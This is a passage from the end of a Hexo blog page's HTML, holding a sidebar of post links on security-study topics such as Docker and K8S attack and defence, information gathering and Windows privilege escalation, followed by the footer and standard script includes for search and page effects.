href="/2025/06/17/%E4%BA%91%E6%94%BB%E9%98%B2-%E4%BA%91%E5%8E%9F%E7%94%9F-docker/">云原生-docker</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/06/17/%E4%BA%91%E6%94%BB%E9%98%B2-k8s%E6%90%AD%E5%BB%BA/">云攻防-K8S搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/06/17/%E4%BA%91%E6%94%BB%E9%98%B2-K8S%E5%AE%89%E5%85%A8/">云攻防-K8S安全</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/06/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-3/">信息收集-3</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/06/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2/">信息收集-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/06/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1/">信息收集-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/06/17/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-3/">权限提升-3-Win提权</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2025 <a href="/." rel="nofollow">Hao's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><script type="text/javascript" src="https://unpkg.com/@fancyapps/fancybox/dist/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=undefined" async></script><link rel="stylesheet" type="text/css" href="https://unpkg.com/@fancyapps/fancybox/dist/jquery.fancybox.min.css"><link rel="stylesheet" type="text/css" href="/css/search.css?v=undefined"><script type="text/javascript" src="/js/search.js?v=undefined"></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+  search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" color="0,0,0" opacity="0.5" zIndex="-2" count="50" src="https://unpkg.com/canvas-nest.js/dist/canvas-nest.js"></script><script type="text/javascript" src="/js/copycode.js?v=undefined" successtext="复制成功！"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css?v=undefined"><script type="text/javascript" src="/js/codeblock-resizer.js?v=undefined"></script><script type="text/javascript" src="/js/smartresize.js?v=undefined"></script></div></body></html>
